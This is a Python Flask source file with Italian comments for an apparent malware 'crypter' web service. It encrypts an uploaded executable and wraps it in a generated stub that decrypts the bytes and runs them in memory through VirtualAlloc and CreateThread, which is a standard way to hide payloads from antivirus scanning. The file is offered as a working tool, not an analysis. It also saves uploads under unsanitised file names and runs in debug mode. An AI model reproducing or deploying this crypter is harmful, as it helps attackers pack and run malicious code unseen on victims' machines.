from flask import Flask, request, send_file, render_template
import os
from cryptography.fernet import Fernet
import zipfile

# Configurazione Flask
app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
OUTPUT_FOLDER = "outputs"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

# Generare una chiave per la crittografia
key = Fernet.generate_key()
cipher = Fernet(key)

# Funzione per crittografare il payload
def encrypt_payload(file_path):
    with open(file_path, "rb") as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    return encrypted_data

# Funzione per creare lo stub runtime
def create_runtime_stub(encrypted_payload, output_path):
    stub_code = f"""
import ctypes
from cryptography.fernet import Fernet

# Chiave di decodifica
key = {key}
cipher = Fernet(key)

# Payload crittografato
encrypted_payload = {encrypted_payload}

def run_pe():
    decrypted_payload = cipher.decrypt(encrypted_payload)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    memory = ctypes.windll.kernel32.VirtualAlloc(0, len(decrypted_payload), 0x1000, 0x40)
    ctypes.memmove(memory, decrypted_payload, len(decrypted_payload))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.cast(memory, ctypes.c_void_p), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

if __name__ == "__main__":
    run_pe()
"""
    with open(output_path, "w") as f:
        f.write(stub_code)

# Route principale per caricare file
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        if "file" not in request.files:
            return "Nessun file selezionato", 400
        file = request.files["file"]
        if file.filename == "":
            return "Nessun file selezionato", 400

        # Salva il file caricato
        uploaded_path = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(uploaded_path)

        # Crittografia del file
        encrypted_payload = encrypt_payload(uploaded_path)

        # Creazione dello stub runtime
        runtime_stub_path = os.path.join(OUTPUT_FOLDER, "runtime_stub.py")
        create_runtime_stub(encrypted_payload, runtime_stub_path)

        # Creazione del file ZIP
        zip_path = os.path.join(OUTPUT_FOLDER, "crypter_runtime.zip")
        with zipfile.ZipFile(zip_path, "w") as zipf:
            zipf.write(runtime_stub_path, arcname="runtime_stub.py")

        return send_file(zip_path, as_attachment=True)

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
